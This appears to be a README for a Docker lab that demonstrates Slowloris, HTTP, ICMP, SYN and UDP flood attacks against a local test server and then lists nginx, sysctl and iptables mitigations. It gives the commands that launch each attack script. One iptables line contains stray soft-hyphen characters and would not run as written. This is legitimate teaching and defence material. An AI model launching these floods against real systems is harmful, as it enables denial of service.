# dos-attack-examples
Test couple of possible dos attacks via 2 containers: client (attacker) and server (defender)

1. Build attacker image
```shell
docker build -f ./attacker/Dockerfile -t dos-attacker ./attacker
```

2. Start defender container and create network
```shell
docker-compose up -d
```

## Attacks

### Slowloris
Run `attacker/scripts/slowloris.php` to send hanging 100 GET requests to http://dos-server
```shell
docker run -it --rm \
  --name slowloris \
  -v "$(pwd)"/attacker/scripts:/usr/scripts \
  --network="dos-attack-examples_custom-net" \
  dos-attacker \
  php /usr/scripts/slowloris.php get 100 dos-server attacker-host
```

### Http flood
Run `attacker/scripts/http_flood.php` to send 100 async GET requests to http://dos-server 5 times

```shell
docker run -it --rm \
  --name http-flood \
  -v "$(pwd)"/attacker/scripts:/usr/scripts \
  --network="dos-attack-examples_custom-net" \
  dos-attacker \
  php /usr/scripts/http_flood.php http://dos-server 100 5
```

### Ping flood (ICMP flood)
Run `attacker/scripts/ping_flood.sh` script to send ping requests

```shell
docker run -it --rm \
  --name ping-flood \
  -v "$(pwd)"/attacker/scripts:/usr/scripts \
  --network="dos-attack-examples_custom-net" \
  dos-attacker \
  sh /usr/scripts/ping_flood.sh
```

### Long ping flood
Run `attacker/scripts/long_ping.sh` script to sending an IP packet larger than the 65,536 bytes

```shell
docker run -it --rm \
  --name ping-flood \
  -v "$(pwd)"/attacker/scripts:/usr/scripts \
  --network="dos-attack-examples_custom-net" \
  dos-attacker \
  sh /usr/scripts/long_ping.sh
```

### SYN flood
Run `attacker/scripts/syn_flood.php` script to sending an SYN requests without ACK for 10 seconds with 65000 bytes packets

```shell
docker run -it --rm \
  --name ping-flood \
  -v "$(pwd)"/attacker/scripts:/usr/scripts \
  --network="dos-attack-examples_custom-net" \
  dos-attacker \
  php /usr/scripts/syn_flood.php host=dos-server port=80 time=10 bytes=65000
```

### UDP flood
Run `attacker/scripts/udp_flood.php` script to sending random UDP requests for 10 seconds to dos-server

```shell
docker run -it --rm \
  --name ping-flood \
  -v "$(pwd)"/attacker/scripts:/usr/scripts \
  --network="dos-attack-examples_custom-net" \
  dos-attacker \
  php /usr/scripts/udp_flood.php dos-server 10
```

## Protection

### Nginx protection from slowloris
Protections details - https://www.nginx.com/blog/mitigating-ddos-attacks-with-nginx-and-nginx-plus/

Nginx conf file: `./server/conf/nginx/default.conf`

### Nginx protection from http flood
The simplest way is to block IP with subnet
```
location / {
    deny 192.168.1.0/24;
}
```

### OS protections from http flood
```shell
iptables -A INPUT -s 192.168.1.0/24 -j DROP
```

Or more common way to use WAF (Web application firewall). Example - https://www.cloudflare.com/lp/ppc/waf-x

### Protection from SYN flood
Edit `/etc/sysctl.conf`

```
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_max_syn_backlog = 256
net.ipv4.tcp_synack_retries = 2
net.ipv4.tcp_abort_on_overflow = 1
```

or via iptables

```shell
iptables ­A INPUT ­p tcp ­­syn ­m limit ­­limit 1/s 
         ­­limit­burst 3 ­j RETURN
```

### Ping and long ping protection via iptables
```
iptables -I FORWARD -i docker0 -p icmp -j DROP
```

### UPD flood protection via iptables
```shell
iptables -N udp-flood
iptables -A OUTPUT -p udp -j udp-flood
iptables -A udp-flood -p udp -m limit --limit 10/s -j RETURN
iptables -A udp-flood -j LOG --log-level 4 --log-prefix 'UDP-flood attempt: '
iptables -A udp-flood -j DROP
```
